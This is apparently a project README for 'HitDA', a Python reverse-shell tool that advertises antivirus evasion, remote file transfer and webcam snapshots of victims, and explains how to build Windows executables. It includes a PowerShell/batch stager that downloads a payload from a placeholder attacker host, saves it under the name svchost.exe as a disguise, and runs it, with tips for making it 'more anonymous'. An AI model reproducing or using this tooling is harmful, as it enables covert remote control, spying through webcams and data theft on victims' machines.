# HitDA
HitDA is a Multi-Function utilization script based on Reverse Shell write in Python3 for Kali Linux.
It's not a meterpreter, so it is easy to bypass the **AV-Software**.You can use it like a 
reverse shell, but it also provides some powerful functions which are similar to Meterpreter.
Like **File Download/Upload**, **Webcam snapshot**, I will continue to add more function
 later.
 
##Setup
````
git clone https://github.com/HalukShan/HitD.git
````
 You need to install some dependencies on your Kali Linux, Use
 ````
cd HitDA; pip3 install -r ./requirements.txt
````
And install `pyinstaller`
```
pip3 install pyinstaller
```
Next install `docker-pyinstaller`, this tool help you generate a 
Windows `.exe` file more easily, but you should install docker first.
Now I give the complete steps below:

Add Docker PGP Authkey
````
curl -fsSL https://download.docker.com/linux/debian/gpg | sudo apt-key add -
````
Config Docker APT
```
echo 'deb [arch = amd64] https://download.docker.com/linux/debian buster stable'| sudo tee /etc/apt/sources.list.d/docker.list
```
Update apt and install
```
sudo apt-get update; sudo apt-get install docker-ce
```
Enable docker
```
sudo systemctl enable docker
```
After complete these steps, you can download `docker-pyinstaller`:
```
cd HitDA; git clone https://github.com/cdrx/docker-pyinstaller.git
```
Now you've done all the steps

##Usage
```
cd HitDA
```
Run the main script
```
python3 HitDA.py
```
Now you can see the menu
```
[*] Starting HitD...
[+] Init Success


    __    __   __  .___________. _______       ___      
   |  |  |  | |  | |           ||       \     /   \     
   |  |__|  | |  | `---|  |----`|  .--.  |   /  ^  \    
   |   __   | |  |     |  |     |  |  |  |  /  /_\  \   
   |  |  |  | |  |     |  |     |  '--'  | /  _____  \  
   |__|  |__| |__|     |__|     |_______/ /__/     \__\ 
                                                        

author: HalukShan
 =========================================================
||                     Menu Option                       ||
||                                                       ||
|| [0] Generate Script                                   ||
|| [1] Start Listening                                   ||
|| [9] Exit                                              ||
 =========================================================
```
When you choose 0, you can choose the script with webcam snap function
or not, the webcam function will increase the file size to about
**50MB**, otherwise, it's about **5MB**. You can also use the **powershell** 
script to automate download the script and execute, it will be more
anonymous and customizable. Like:
````
mkdir C:\tmp
cd C:\tmp
powershell $client = new-object System.Net.WebClient;$client.DownloadFile('http://youripordomain/script.exe','svchost.exe');
svchost.exe
````
Save as .bat file, and use battoexe to generate a small exe file.

###Listening
Choose option 1 to start the listening mode


